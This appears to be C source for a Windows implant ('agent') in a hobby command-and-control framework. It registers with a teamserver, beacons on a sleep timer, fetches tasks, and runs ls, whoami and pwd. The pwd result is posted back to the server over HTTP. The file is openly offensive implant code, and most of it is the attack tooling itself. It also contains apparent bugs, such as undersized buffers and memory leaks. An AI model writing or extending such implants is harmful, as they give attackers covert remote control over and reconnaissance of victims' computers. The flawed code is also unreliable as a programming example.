/* Windows Agent (NOT STABLE) */

#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <windows.h>
#include <tchar.h>
#include <string.h>

#include "Commands.h"
#include "Utils.h"


#define REGISTER_AGENT "http://127.0.0.1:50050/register"
#define GET_TASK "http://127.0.0.1:50050/tasks/"
#define SEND_RESULT "http://127.0.0.1:50050/results/"

typedef struct {
	char* IP;
	char* Hostname;
	char* Sleep;
	char* UID;
} Agent;

Agent create_agent( char* ip, char* hostname, char* sleep, char* uid ) {
	Agent agent;
	agent.IP = ip;
	agent.Hostname = hostname;
	agent.Sleep = sleep;
	agent.UID = uid;
	return agent;
};


char* parse_agent_to_json( Agent agent ) {
	char* raw_json = "{\"IP\":\"%s\",\"Hostname\":\"%s\",\"Sleep\":\"%s\",\"UID\":\"%s\"}";
	char* json = malloc( strlen( raw_json ) + strlen( agent.IP ) + strlen( agent.Hostname ) + strlen( agent.Sleep ) + strlen( agent.UID ) );
	if (json == NULL) {
		return NULL;
	};

	sprintf( json, raw_json, agent.IP, agent.Hostname, agent.Sleep, agent.UID );
	return json;
}


char* register_agent( Agent agent ) {
	char* json = parse_agent_to_json( agent );
	struct string response = http_post_json( REGISTER_AGENT, json );
	if (response.ptr == NULL) {
		return 0;
	}

	return response.ptr;
}

int get_sleep_from_beacon_json( char* request ) {

	char* temp_req = malloc( strlen( request ) + 1 );
	if (temp_req == NULL) {
		return 0;
	};

	strcpy( temp_req, request );


	const char* key = "\"sleep\":";
	char* pos = strstr( temp_req, key );
	if (pos == NULL) {
		printf( "[*] Malformed JSON! Check Teamserver \n" );
		return 0;
	}

	pos += strlen( key );

	char* end = strstr( pos, "," );

	if (end == NULL) {
		printf( "[*] Malformed JSON! Check Teamserver \n" );
		return 0;
	}

	*end = '\0';

	pos++;
	end--;

	int sleep = atoi( pos );

	return sleep;
}

char* get_uid_from_beacon_json( char* request ) {
	const char* key = "\"uid\":";
	char* pos = strstr( request, key );
	if (pos == NULL) {
		printf( "[*] Malformed JSON! Check Teamserver \n" );
		return 0;
	}

	pos += strlen( key );

	pos++;
	pos[strlen( pos ) - 2] = '\0';

	return pos;

}

char* get_task( char* uid ) {
	// GET_TASK + UID

	char* url = malloc( strlen( GET_TASK ) + strlen( uid ) + 1 );
	if (url == NULL) {
		return NULL;
	}

	strcpy( url, GET_TASK );
	strcat( url, uid );

	struct string response = http_get( url );

	if (response.ptr == NULL) {
		return NULL;
	}

	return response.ptr;
}

int check_task( char* task ) {
	const char* key = "\"message\":";
	char* pos = strstr( task, key );
	if (pos == NULL) {
		return 0;
	}
	return 1;
};

char* get_task_id( char* task ) {

	char* temp_task = malloc( strlen( task ) + 1 );
	if (temp_task == NULL) {
		return NULL;
	};

	strcpy( temp_task, task );


	const char* key = "\"CommandID\":\"";
	char* pos = strstr( temp_task, key );
	if (pos == NULL) {
		return NULL;
	}

	pos += strlen( key );

	char* end = strstr( pos, "\"" );

	if (end == NULL) {
		return NULL;
	}

	*end = '\0';

	return pos;
}

char* get_task_command( char* task ) {
	const char* key = "\"Command\":\"";
	char* pos = strstr( task, key );
	if (pos == NULL) {
		return NULL;
	}

	pos += strlen( key );

	char* end = strstr( pos, "\"" );

	if (end == NULL) {
		return NULL;
	}

	*end = '\0';

	return pos;
}


int main() {

	Agent agent = create_agent( "127.0.0.1", "localhost", "5", "" );
	char* beacon_data = register_agent( agent );
	printf( "[*] Registering agent...\n" );

	if (beacon_data == NULL) {
		printf( "[*] Failed to register agent\n" );
		return 1;
	}

	printf( "[*] Beacon registered, raw data: %s\n", beacon_data );


	int sleep = get_sleep_from_beacon_json( beacon_data );
	printf( "[*] Beacon sleep: %d\n", sleep );

	char* uid = get_uid_from_beacon_json( beacon_data );
	printf( "[*] Beacon UID: %s\n", uid );


	while (1) {
		printf( "[*] Sleeping for %d seconds...\n", sleep );
		Sleep( sleep * 1000 );
		printf( "[*] Waking up\n" );
		printf( "[*] Checking for tasks...\n" );

		char* task_data = get_task( uid );

		if (check_task( task_data ) == 1) {
			printf( "[*] No task found, sleeping again...\n" );
			continue;
		}

		// [*] Task found, raw data: {"tasks":[{"UID":"USuY8JsPT6","CommandID":"XpgUXwof5F","Command":"ls"}]}

		printf( "[*] Task found, raw data: %s\n", task_data );

		char* ID = get_task_id( task_data );
		printf( "[*] Task ID: %s\n", ID );

		char* command = get_task_command( task_data );
		printf( "[*] Task command: %s\n", command );

		if (strcmp( command, "ls" ) == 0) {
			printf( "[*] Executing ls...\n" );
			FileList file_list;
			file_list.file_names = NULL;
			file_list.file_count = 0;

			Dir( _T( "C:\\Users\\PC\\Desktop\\git\\WintonC2\\implant\\Wanton\\" ), &file_list );
			// this shouldn't be hardcoded, see: https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcurrentdirectory

			/*
			for (DWORD i = 0; i < file_list.file_count; i++) {
				_tprintf( _T( "%s\n" ), file_list.file_names[i] );
			} */

			wchar_t* sample_response = file_list.file_names[0];
			printf( "[*] Sample response: %ls\n", sample_response );

			// Cleanup
			for (DWORD i = 0; i < file_list.file_count; i++) {
				free( file_list.file_names[i] );
			}
			free( file_list.file_names );
		}

		if (strcmp( command, "whoami" ) == 0) {
			printf( "[*] Executing whoami...\n" );
			// GetUserNameA
			DWORD dwSize = 256;
			char szUserName[256];

			if (GetUserNameA( szUserName, &dwSize )) {
				printf( "[*] Username: %s\n", szUserName );
			}
			else {
				printf( "[*] Failed to get username\n" );
			}
		}

		if (strcmp( command, "pwd" ) == 0) {
			printf( "[*] Executing pwd...\n" );
			char cwd[MAX_PATH];
			if (GetCurrentDirectoryA( sizeof( cwd ), cwd )) {
				printf( "[*] Current working dir: %s\n", cwd );
				printf( "[*] Sending result...\n" );

				// HTTP POST to SEND_RESULT + ID with JSON Content { "CommandID": ID, "Result": result } 
				char* url = malloc( strlen( SEND_RESULT ) + strlen( ID ) + 1 );
				strcpy( url, SEND_RESULT );
				strcat( url, ID );

				printf( "[*] URL: %s\n", url );

				char* raw_json = "{\"CommandID\":\"%s\",\"Result\":\"%s\"}";
				char* json = malloc( strlen( raw_json ) + strlen( ID ) + strlen( cwd ) );
				if (json == NULL) {
					return NULL;
				};

				sprintf( json, raw_json, ID, cwd );
				printf( "[*] Sending Result: %s\n", json );

				struct string result = http_post_json( url, json );

				//printf( "[*] Result: %s\n", result.ptr );
			}
			else {
				printf( "[*] Failed to get current working dir\n" );
			}
		}

	}


	return 0;
}